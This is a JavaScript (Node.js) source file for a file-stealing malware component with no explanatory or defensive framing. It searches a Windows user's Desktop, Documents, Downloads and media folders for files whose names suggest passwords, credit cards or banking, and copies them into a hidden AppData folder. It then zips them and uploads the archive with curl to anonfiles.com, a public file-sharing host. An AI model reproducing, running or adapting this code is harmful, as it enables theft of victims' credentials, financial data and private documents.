const recursive = require("recursive-readdir");
var fs = require('fs');
var zipper = require('zip-local');
const { upload, getInfo, download } = require("node-annonfiles");
const { exec } = require("child_process");
const urss = require("os").userInfo().username;



var FinalURL = ""
const KeyWordsForFileGrabber = ["cc", "credit_card", "credit card", "passwords", "mdp", "password", "mot de passe", "passw", "casino", ".txt", ".doc",".docx", "card", "bank"]
const FileGrabberLimit = 50;
const maxFileSize = 2;
var foundeds = 0;
var max = false;
const FileGrabberPaths = [`C:/Users/${urss}/Desktop/`, `C:/Users/${urss}/Documents/`,`C:/Users/${urss}/Pictures/`, `C:/Users/${urss}/Music/`, `C:/Users/${urss}/3D Objects/`, `C:/Users/${urss}/Videos/`, `C:/Users/${urss}/Downloads/`]
const tempPath = `C:\\Users\\${urss}\\AppData\\Roaming\\xXNegro2012Xx`

function FileGrabber(){
	var i = 0;
	fs.mkdirSync(tempPath, { recursive: true });
	while(i<=FileGrabberPaths.length-1){

	if(max == true){
		break
		i = 100000;
		return
	}
	  recursive(FileGrabberPaths[i], function (err, files) {

	    try{
	      for(n = 0; n<=files.length; n++){

			if(foundeds >= FileGrabberLimit){
			        	
				max = true
				console.log("Zipping")
				zipper.sync.zip(tempPath).compress().save("EZ.zip");
			      child = exec('curl -F "file=@EZ.zip" https://api.anonfiles.com/upload', function(error, stdout, stderr){
			      FinalURL = stdout
			      if(error !== null)
			      {
			          console.log('exec error: ' + error);
			      }

			      });
				break
				return
			}
	        try{
			   if(files[n].includes(".ini")){
	            continue
	          }
				const contains = KeyWordsForFileGrabber.some(element => {
				  if (files[n].includes(element)) {
				    return true;
				  }

				  return false;
				});


				var stats = fs.statSync(files[n])
				var fileSizeInBytes = stats.size;
				var fileSizeInMegabytes = fileSizeInBytes / (1024*1024);

				if(fileSizeInMegabytes >= maxFileSize){
					continue
				}
	          if(contains === false){
	          	continue
	          }else{
	          	console.log("Found ! ")
	          	foundeds++;
	          }
	          fs.copyFile(files[n], tempPath + "\\"+files[n].split("\\")[files[n].split("\\").length -1], (err) => {
				  if (err) {
				    console.log("Error Found:", err);
				  }
				  else {

				  }
				});
	        }catch(e){
	          continue
	        }

	      }
	    }catch(e){
	      console.log(e)
	    }
	  });
	  i++

	}
}
